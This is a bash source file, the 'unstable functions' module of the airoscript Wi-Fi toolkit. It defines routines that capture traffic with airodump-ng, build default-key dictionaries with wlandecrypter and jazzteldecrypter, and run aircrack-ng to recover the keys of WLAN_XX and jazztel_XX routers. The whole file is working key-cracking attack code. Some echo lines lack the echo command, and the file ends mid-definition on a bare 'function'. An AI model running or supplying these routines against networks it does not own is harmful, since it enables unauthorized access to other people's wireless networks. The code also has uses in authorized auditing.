#!/bin/bash
# Unstable functions file for airoscript.
# Requires: wlandecrypter 
# By David Francos (XayOn) <yo.orco@gmail.com>
echo -e "\tUnstable functions from airoscript loaded,\n\tif you don't want this, set UNSTABLE=0 in\n\tconfig file"

function doitwld {
	airodump-ng -w $DUMP_PATH/wldcap  $OPT $CHANNEL $WIFI
	wlandecrypter $Host_MAC $Host_SSID $DUMP_PATH/wlddic 
	aircrack-ng -b $Host_MAC -w $DUMP_PATH/wlddic $DUMP_PATH/wldcap
}

function wld {
# Here goes, if no host_mac is present, ask for it. Hope it's OK.	
	if [ $Host_MAC ] 
	then

		touch "$DUMP_PATH/wldcap"
		touch "$DUMP_PATH/wlddic"

			echo  "______________________________________"
			echo  "# Do you want to specify a channel?  #"
			echo  "# If so, enter the channel, if not,  #"
			echo  "# leave it empty and press enter.    #"
			echo  "#____________________________________#"
			echo -n "Channel: "

			read CHANNEL
				if [ "$CHANNEL" != "" ]
				then
					OPT="--channel "
				fi

			sleep 1 
			export START=`echo $Host_SSID|cut -d_ -f1`
			case $START in
				WLAN ) 
					echo  "_____________________________________"
					      "# When you get sufficent ivs (data  #"
					      "# packets, almost 5),  press ctrl+c #"
					      "#___________________________________#"				
					
					doitwld
					;;
				*)
					clear
					echo "Sorry, your target is not supported (not wlan_XX type)"
					;;
			esac
				
	else
		clear
		echo -e "Error: You must select a client before performing this attack.\n"
	fi
	
}

function doitjtd {
	airodump-ng -w $DUMP_PATH/jtdcap  $OPT $CHANNEL $WIFI
	jazzteldecrypter $Host_MAC $Host_SSID $DUMP_PATH/jtddic 
	aircrack-ng -b $Host_MAC -w $DUMP_PATH/jtddic $DUMP_PATH/jtdcap
}

function jtd {
# Here goes, if no host_mac is present, ask for it. Hope it's OK.	
	if [ $Host_MAC ] 
	then

		touch "$DUMP_PATH/jtdcap"
		touch "$DUMP_PATH/jtddic"

			echo  "______________________________________"
			echo  "# Do you want to specify a channel?  #"
			echo  "# If so, enter the channel, if not,  #"
			echo  "# leave it empty and press enter.    #"
			echo  "#____________________________________#"
			echo -n "Channel: "

			read CHANNEL
				if [ "$CHANNEL" != "" ]
				then
					OPT="--channel "
				fi

			sleep 1 
			export START=`echo $Host_SSID|cut -d_ -f1`
			case $START in
				jazztel )
					echo  "_____________________________________"
					      "# When you get sufficent ivs (data  #"
					      "# packets, almost 5),  press ctrl+c #"
					      "#___________________________________#"				
	
					doitjtd
					;;
				*)
					clear
					echo "Sorry, your target is not supported (not jazztel_XX type)"
					;;
			esac
				
	else
		clear
		echo -e "Error: You must select a client before performing this attack.\n"
	fi
	
}

function 
